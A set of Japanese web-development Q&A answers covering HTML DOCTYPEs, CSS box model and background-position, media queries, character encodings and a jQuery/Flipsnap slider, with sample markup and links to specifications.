タグを正しく記述できていないページは検索で上位に表示されにくいです。 アフィリエイトは見に来てクリックされ購入されて、はじめてポイントとなるので、検索で上位に表示されないのは弱いです。 アフィリエイトにはブログが向いていますよ。タグがわからなくても簡単にできます。
HTML5とストリーミングは関係ないです。 　HTML5では<video>タグが加わりましたから、動画コンテンツを制御できますがデータ自体は、ストリームサーバーから提供させないとなりません。 　HTML5で<video src="rtsp://　とか・・、HTTPサーバーを使うことも出来ますが・・ 　通信プロトコルと、文書の書式は区別しましょう。 　
そこにmarginを使うなら、 #soto{ width:320px; height:480px; background-color:#FB0004; padding:1px;/* とpaddingを0以上の値でしたいしないとなりません */ } あるいは、 #soto{ width:320px; height:480px; background-color:#FB0004; border:#FB0004 solid 1px; } この理由は、 　⇒8 ボックスモデル( http://momdo.s35.xrea.com/web-html-test/spec/CSS21/box.html ) 　⇒9 視覚整形モデル( http://momdo.s35.xrea.com/web-html-test/spec/CSS21/visuren.html ) 　⇒10 視覚整形モデル詳細( http://momdo.s35.xrea.com/web-html-test/spec/CSS21/visudet.html ) を参照してください。大変な量なので説明は省きます。 この場合、marginで指定するよりposition:relative;position:absoluteで指定するほうが楽ですよ。
＞background-position のleft のピクセルを上げたら、このimageが普通は右に移動してくれそうなもんなんですがなぜか下に動いてしまいます。 　違います。 background-position left 5px は、左端で上から5pxと言う意味です。 「少なくとも1つの値がキーワードでない場合は、最初の値は水平方向の位置を表し、2番目は垂直位置を表す。( http://momdo.s35.xrea.com/web-html-test/spec/CSS21/colors.html#propdef-background-position )」 　この仕組みは、他のプロパティでも共通な方法なので間違えるはず無いですけど background-repeat : no – repeat 　これも間違い!!、no-repeatです。 background-position left 5px 　左0%、上から5pxと言う意味 　とにかく仕様書を最初から通して読んでおきましょう。
ブラウザによって差がありますが、 リンクの擬似クラスと子孫セレクタをつかって・・・ a:link img{text-decoration:none;border-style:none;} a要素内のすべての場合は(a name="") a img{text-decoration:none;border-style:none;} 通常は残しておいて、ナビゲーション内だけなら 　div.nav a img{} と指定すると良いでしょう。 　ユーザーインターフェースに関わる部分なので、障害者のことを考えると、リンクがあると明示したほうが良いのです。 a img{border:none;text-decoration:none;} a:hover{border:1px solid red;} として分かりやすくしても良いでしょう。
そもそも「500px以下の記述する場所」の記述自体も間違ってますね。 500px以内なんだから「最大幅が500px」です。 min-widthではなくmax-width @media only screen and (max-width: 500px)
いつもまず、仕様書を確認する。 「HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/conform.html#h-4.1 )」 　⇒7.2 HTMLバージョン情報( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#version-info ) 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML 4.01厳密型DTD。(上記HTML4.01strictのこと) 　これは、推奨しないこととなった要素や属性を含まず、またフレーム設定用の要素・属性をも含まない。 このDTDを用いる文書は、次の文書型宣言をせよ。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［The global structure of an HTML document (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#version-info )］より ・XHTMLはDOCTYPE宣言が異なり、XML宣言も必要になります。 ・XHTML1.1/HTML5にはすでにstrict以外ありません。 ・XHTMLは、他のアプリケーションとの連携などが必要な場合以外使用しなくて良いでしょう。 ＞<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> や ＞<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"> にすると、 　⇒DOCTYPEスイッチ－HTMLの基本( http://www.htmq.com/htmlkihon/302.shtml ) にあるように、ブラウザ間の表示差に悩まされることになります。ここでの「ブラウザ間で表示差がある」という質問のほとんどすべてはこれに起因しています。 　なお、 　⇒Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html ) 　のDATA入力(右上)で作成したHTMLをチェックして、その説明を読むと上達が早いです。 　
DOCTYPEは正しく書きましたか？ <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> ・・これで、「下記のautoに未対応用のセンタリング」の必要はほとんどなくなるはずです。IE7以降は中央に配置されます。 　全体を囲む必要は無いですが、もし使用するなら、mainより、articleのほうが適切でしょう。(idやclass名は文書構造を示すために記述します。 　文書に構造を付加するため( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#h-7.5.4 ) 　が、HTML5を見据えるとHTML5の要素名にしてclassのほうが良いでしょう。 　⇒4.5 Grouping content — HTML5( http://www.w3.org/TR/html5/grouping-content.html#the-main-element ) 　⇒4.4.2 The article element( http://www.w3.org/TR/html5/sections.html#the-article-element ) 　幅は最近のようにスマホや幅広ディスプレイなど様々な利用を考えるとリキッドのほうが楽でしょう。 ★タブは＿に置換してあるので戻す。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;} div.header,div.section,div.footer{ width:70%; min-width:470px;/* スマホ用 */ max-width:900px;/* 幅広ディスプレイ用 */ margin:0 auto;/* 中央配置 */ padding:5px; } div.section{position:relative;}/* 内容の位置基準にするため */ div.section div.section{ min-height:200px; margin:0 0 0 21%;/* 左を空ける */ width:auto;/* 幅指定を戻す */ min-width:0; } div.section h2,div.section p{ margin-left:21%;/* 左を空ける */ } div.section div.section p{ margin-left:0;/* 元に戻す */ } div.section div.contentTable{ position:absolute; /* 以下、position:staticでない直近の親を参照 */ width:20%;height:100%;/* 目次の位置決め */ top:0;left:0; } /* 分かりやすいように色 */ body{background-color:gray;} div.header{background-color:white;} div.section{background-color:lime;} div.footer{background-color:aqua;} div.section div.contentTable{background-color:fuchsia;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<p>・・・</p> ＿＿<div class="section" id="section1"> ＿＿＿<h3>見出し</h3> ＿＿＿<p>記事</p> ＿＿</div> ＿＿<div class="section" id="section2"> ＿＿＿<h3>見出し</h3> ＿＿＿<p>記事</p> ＿＿</div> ＿＿<div class="contentTable"> ＿＿＿<ol> ＿＿＿＿<li><a href="#section1">1章</a></li> ＿＿＿＿<li><a href="#section2">2章</a></li> ＿＿＿</ol> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
まだ初心者でもなさそうですね。ちゃんと体系的に学んでいますか？どこかのソースを理解せずにコピペしてるだけでは入門もできていないですよ。 セレクタ｛プロパティ：値｝を理解していなさそう。 どこの｛何を：どうする｝です。 ご提示いただいたソースの場合 table_moji_rightのクラスのtdの｛文字列を：右揃えにする｝ tｄの｛バックグランドを：赤くする｝ なので、当然、すべてのtdは赤くなります。 答えだけ言うと td.table_moji_right { text-align: right; background-color: red; } のみ td { background-color: red; } は消す。同じセレクター内に複数の指定を描くときは;でつなげます。いくつでも可。 td{}はｔｄがセレクタになります。つまり全てのtdが対象となります。 ちなみに、たぶんhtmlも間違っていそうな気がします。数字やaaaではわかりませんが、私ならたぶん表内の見出しと値という風に区別すると思います。 css---------- table,td,th{border-collapse:collapse;border:1px solid #000;} th{text-align: right; background-color: red;font-weight:normal;} html--------- <table> <tr><th>1</th><td>aaa</td></tr> <tr><th>100</th><td>iii</td></tr> </table> 見た目でタグを付けない事。これは、今どのような表現ができるかということよりも大事です。見た目ではなく、文章構造に対してタグを付けることが見た目でタグを付けるよりｃｓｓは扱いやすいです。 table_moji_rightなんてクラス名を付けてしまったら、赤くするのもクラス名矛盾しますよね？赤くしたいタグではなく、目立たせたいとか見出しであるとかの理由でタグを付け、その要素をｃｓｓでデザインするという考え方です。htmlのように赤くしたい、文字の大きさを変えたい。と1回ずつタグ指定はしません。ｔｈでなかったら、値段なら、priceとかのクラス名です。 cssの原則で、ここでつまずくと、学びが大変になります。間違った方向に進み、ソースが無茶苦茶だけど、作者の使っているブラウザでだけ作者の思い通りに表示されているということになりかねません。一度基礎から体系的に入門されることをお勧めします。
「　」では空白にならない場合があるので、そんなときにとりあえず「&nbsp;」を使っています。 ブラウザ等で見え方が変わるので、CSSで後ほど調整するようにしています。
普通に table{font-size:○○%;color:#○○○○○○;} みたいにやれば良いんじゃないですか？
　実際に記述されている文字コードと、charsetの文字コードが一致していないと文字化けを起こします。 　また、サーバーの応答ヘッダを確認する必要がある場合もあります。 firefoxのアドオンに、Live HTTP headers( https://addons.mozilla.jp/firefox/details/3829 )がありますので、それを使用するとサーバーからの応答ヘッダに HTTP/1.1 200 OK ・・・【中略】・・・ Content-Type: text/html; charset=UTF-8 のように書かれている場合、ユーザーエージェント(ブラウザ)によると、文字コードの判断を誤る可能性があります。レンタルサーバーでしたら、応答ヘッダを変更できるのですが、相でない場合は、HTMLをその文字コードに合わせる（当然、metaの値もあわせる）必要があるでしょう。 とりあえず 　⇒Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html ) などでチェックしてみる。
各スライドに別々の id もしくは class を付けて、flipsnapのイニシャライズを別々にしてください。 例） -------- HTML -------- <div id="flipsnap1" class="viewport"> <ul class="flipsnap"> <li><p><a href="data/images/a1.gif" rel="lightbox[roadtri]"><img src="data/images/b1.gif" alt="b1" width="480" height="320" /></a></p></li> <li><p><a href="data/images/a2.gif" rel="lightbox[roadtri]"><img src="data/images/b2.gif" alt="b2" width="480" height="320" /></a></p></li> <li><p><a href="data/images/a3.gif" rel="lightbox[roadtri]"><img src="data/images/b3.gif" alt="b3" width="480" height="320" /></a></p></li> <li><p><a href="data/images/a4.gif" rel="lightbox[roadtri]"><img src="data/images/b4.gif" alt="b4" width="480" height="320" /></a></p></li> <li><p><a href="data/images/a5.gif" rel="lightbox[roadtri]"><img src="data/images/b5.gif" alt="b5" width="480" height="320" /></a></p></li> </ul> <div class="pointer"> <span class="current"></span> <span></span> <span></span> <span></span> <span></span> </div><!-- .pointer --> </div><!-- .viewport --> <div id="flipsnap2" class="viewport"> <ul class="flipsnap"> <li><p><a href="data/images/a1.gif" rel="lightbox[roadtri]"><img src="data/images/b1.gif" alt="b1" width="480" height="320" /></a></p></li> <li><p><a href="data/images/a2.gif" rel="lightbox[roadtri]"><img src="data/images/b2.gif" alt="b2" width="480" height="320" /></a></p></li> <li><p><a href="data/images/a3.gif" rel="lightbox[roadtri]"><img src="data/images/b3.gif" alt="b3" width="480" height="320" /></a></p></li> <li><p><a href="data/images/a4.gif" rel="lightbox[roadtri]"><img src="data/images/b4.gif" alt="b4" width="480" height="320" /></a></p></li> <li><p><a href="data/images/a5.gif" rel="lightbox[roadtri]"><img src="data/images/b5.gif" alt="b5" width="480" height="320" /></a></p></li> </ul> <div class="pointer"> <span class="current"></span> <span></span> <span></span> <span></span> <span></span> </div><!-- .pointer --> </div><!-- .viewport --> -------- JavaScript -------- <script type="text/javascript"> $(function() { var $pointer1 = $('#flipsnap1 .pointer span'); var flipsnap1 = Flipsnap('#flipsnap1 .flipsnap', { distance: 480, transitionDuration: 1000 }); flipsnap1.element.addEventListener('fspointmove', function() { $pointer1.filter('.current').removeClass('current'); $pointer1.eq(flipsnap1.currentPoint).addClass('current'); }, false); var $pointer2 = $('#flipsnap2 .pointer span'); var flipsnap2 = Flipsnap('#flipsnap2 .flipsnap', { distance: 480, transitionDuration: 1000 }); flipsnap2.element.addEventListener('fspointmove', function() { $pointer2.filter('.current').removeClass('current'); $pointer2.eq(flipsnap2.currentPoint).addClass('current'); }, false); }); </script>
覗いてみましたが、このサイトではFlashのローカル記憶領域に挑戦回数を記録しているようです。 (なので、やろうと思えばインチキも可能です) 他の方のご回答にもありますが、 ・Cookieに保存する ・セッションID等を見てユーザ判別し、サーバ側に回数を保存する という方法も使えます。
firefoxだと動作しますよ。 いくつか文法上の間違いがある。 DOCTYPEと中身の不一致 />になっていなかったり <nav>のように他のHTMLの要素があったり 　⇒Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html )
スタイルシートの質問だと思いますが、スタイルシートを導入する最大の目的は、「構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.4.1 )」の分離です。 ＞テーブルのレイアウトを崩したくないので、幅は固定したまま、かつ画像はブラウザサイズによって自動縮小にするようにしたいのですが、 　とありますが、仕様書を一度でも読まれていたら『単に文書内容を整形する目的だけで表を用いるべきでない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/tables.html#h-11.1 )』や『ページレイアウトの目的で表を用いる。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/present/styles.html#h-14.1 )』が否定されている事は御存知だと思います。 　拝見するところ、アルバムのような画像とその説明のようです。でしたらHTMLは、 単純に <div class="section" id="PhotoList"> 　<h2>アルバム</h2> 　<div class="section"> 　　<h3>写真タイトル</h3> 　　<p>記事・・・</p> 　　<div class="figure"> 　　　<img src="" width="" height="" alt=""> 　　　<div class="figcaptin"> 　　　　画像の説明 　　　</div> 　　</div> 　</div> 　<div class="section"> 　　<h3>写真タイトル</h3> 　　<p>記事・・・</p> 　　<div class="figure"> 　　　<img src="" width="" height="" alt=""> 　　　<div class="figcaptin"> 　　　　画像の説明 　　　</div> 　　</div> 　</div> の繰り返しなどになるはずです。!!! 　　★id属性及び class属性と併用することで、文書に構造を付加する( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#h-7.5.4 )もので、wakuとかa,bじゃ意味ないですし、後々困るのはあなたです。HTML5では、HTML4に文書構造を示す要素がなく、DIVを使わざるを得なかった反省から、『文書を構造化するために要素が追加されました。( http://standards.mitsue.co.jp/resources/w3c/TR/html5-diff/#new-elements )』。言い換えればそのようなclass、idが使われてきたものを要素にしたと言うこと。 HTML5だと <section id="PhotoList"> 　<h2>アルバム</h2> 　<section> 　　<h3>写真タイトル</h3> 　　<p>記事・・・</p> 　　<figure> 　　　<img src="" width="" height="" alt=""> 　　　<figcaptin> 　　　　画像の説明 　　　</figcaption> 　　</figure> 　</section> 　<section> 　　<h3>写真タイトル</h3> 　　<p>記事・・・</p> 　　<figure> 　　　<img src="" width="" height="" alt=""> 　　　<figcaptin> 　　　　画像の説明 　　　</figcaption> 　　</figure> 　</section> になりますね。 　ひょっとして、画像リスト <dl> 　<dt>タイトル</dt> 　<dd>記事</dd> 　<dd class="photo"> 　　<img src="" width="" height="" alt=""> 　　<p>説明</p> 　</dd> 　<dt>タイトル</dt> 　<dd>記事</dd> 　<dd class="photo"> 　　<img src="" width="" height="" alt=""> 　　<p>説明</p> 　</dd> ・・のほうが良いかも。あなたの文書はあなたしか分からない。 ★HTMLには、文書の(内容)構造しか書かない!!どのようにプレゼンテーションするかは、そのためのスタイルシートを使用します。 ＞テーブルのレイアウトを崩したくない ＞画像を自動で縮小したい 　整合性が全く無いように読めます。tableを使う一番の目的は、tableだと 『表を見るために水平スクロールを強いられることがある。 こうした問題を最小限に押さえるため、著者は文書の整形には表ではなくスタイルシートを用いるべきである。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/tables.html#h-11.1 )』 　なぜtableレイアウトなのかを説明していただけると・・ ★文中のリンク先は読んでおくこと ★画像を伸縮させる事は可能です（簡単に）が、それには、前提として「CSSスタイルシートを意図した通りに機能させるには、正しい文書解析木が必要です。つまり、正当なHTMLを用いるべきです。( http://jigsaw.w3.org/css-validator/#validate_by_input )」
ここの回答者にも勘違いしている方が多いので指摘しておきますが、JavaとJavaScriptはまったくの別物。JavaScriptを略してJavaと言ってはいけません、強いて言うならJS。 そしてインタラクティブで動きがあるWebサイトの制作に必要なのはJavaScript。JavaScriptの開発を楽にするフレームワークにjQueryなどがあります。 Flashでもインタラクティブで動きがあるサイトは作れますが、この御時世でお金や時間を使って勉強してもあまりメリットがありません。 なにを勉強したらいいかわからない段階ならまずHTMLとCSSをしっかり勉強してください。 これがわかっていない段階でJavaScriptやjQueryに飛びついてもいいことはありません。 また、IE8以下の古いブラウザでは対応していませんが、多少のアニメーションならCSS3でも実現できます。
まず、国外から見る場合でも文字コード宣言が正しければShift_JISでもUTF-8でも問題なく見られます。 (ところで文中Shift-JISとなっていますが正しくShift_JISと書いていますか?) なので、Shift_JIS外の文字を使わないならShift_JISでもよいということになりそうですが、面倒な問題がありやはりUTF-8にすべきです。 何が問題かというと、Shift_JIS外の文字は外国語のためだけのものではないのです。 詳しくは「JIS2004」で検索するとよいと思いますが、WindowsVistaの頃から新しい漢字がWindows標準のMS-IMEで普通に変換できるようになりました。 これらの文字はShift_JISでは扱えませんが、使える文字と使えない文字を見た目で区別することは出来ません。 つまり、普通に文章を打ってもShift_JIS外の文字が混入しますし、どこかからコピーしてきた文章の中にShift_JIS外の文字が入っているかは保存してみるまで分かりません。 これに対応するのは面倒なので、UTF-8をお勧めします。 なお、一応対応策を書いておきますが、お勧めしません。 ・使える漢字と使えない漢字の区別は、MSゴシックで見ると大半が分かります。表示が汚い方が使えない漢字です。例外はありますが。 ・MS-IMEは設定でShift_JISの文字のみしか変換できないようにできます。
